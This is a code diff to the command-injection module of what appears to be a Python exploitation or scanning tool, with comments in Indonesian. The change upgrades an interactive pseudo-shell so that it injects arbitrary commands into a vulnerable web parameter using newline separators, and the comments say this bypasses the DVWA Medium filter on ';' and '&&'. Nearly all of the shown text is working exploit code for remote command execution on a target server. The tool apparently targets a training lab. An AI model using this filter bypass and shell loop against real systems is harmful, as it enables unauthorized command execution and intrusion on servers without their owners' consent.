@@ -131,23 +131,23 @@ class CommandInjectionModule(BaseModule):
             return VerificationResult(VerificationStatus.VALIDATED, 0.95, "MARKER_CONFIRMED", f"Echo via '{separator}'", verify_payload=payload)
         return VerificationResult(VerificationStatus.REJECTED, 0.0, "MARKER_FAILED", "Marker not found")
 
+    # =========================================================================
+    # V4 UPDATE: INTERACTIVE PSEUDO-SHELL (SMART SEPARATOR)
+    # =========================================================================
     def exploit(self, context: TargetContext, finding: Finding):
         print("\n[***] ACTIVATING INTERACTIVE PSEUDO-SHELL [***]")
         print(f"[*] Target: {finding.location} | Parameter: {finding.parameter}")
         
-        separator = self._extract_separator(finding.verify_payload)
+        # GUNAKAN NEWLINE (\n) SEBAGAI SEPARATOR UTAMA
+        # Alasan: 
+        # 1. Bypass filter DVWA Medium (yang menghapus ';' dan '&&').
+        # 2. Eksekusi berurutan (sequential), jadi shell_exec() PHP bakal nunggu 
+        #    semua perintah selesai dan outputnya nggak hilang.
+        # 3. Karakter '&' (background process) bikin shell_exec() PHP cepet kelar 
+        #    dan output aslinya ilang (ini penyebab bug V3).
+        shell_sep = "\n"
         
-        # Logika Pintar buat Chain Command biar outputnya bersih
-        if separator == "|":
-            shell_sep = "&" # Pipe nggak bisa buat chain echo
-        elif separator == "&&":
-            shell_sep = "&"
-        elif separator == "\n":
-            shell_sep = "&"
-        else:
-            shell_sep = separator
-            
-        print(f"[*] Using separator: '{shell_sep}' for shell commands\n")
+        print(f"[*] Using separator: '\\n' (Newline) for shell commands\n")
         
         while True:
             try:
@@ -157,6 +157,8 @@ class CommandInjectionModule(BaseModule):
                 
                 marker_start = "TANPHA_OUT_START"
                 marker_end = "TANPHA_OUT_END"
+                
+                # Susun payload: Newline -> Echo Marker Awal -> Command -> Echo Marker Akhir
                 payload = f"{shell_sep} echo {marker_start} {shell_sep} {cmd} {shell_sep} echo {marker_end}"
                 
                 result = self._send_payload(context, finding.parameter, payload, None)
@@ -167,7 +169,7 @@ class CommandInjectionModule(BaseModule):
                         output = clean_text.split(marker_start)[1].split(marker_end)[0].strip()
                         print(f"\n{output}\n" if output else "\n[*] Executed (no output).\n")
                     else:
-                        print("\n[!] Marker not found.\n")
+                        print("\n[!] Marker not found. Output kosong atau diblokir WAF.\n")
                 else:
                     print("[-] Failed to execute command.")
             except KeyboardInterrupt:
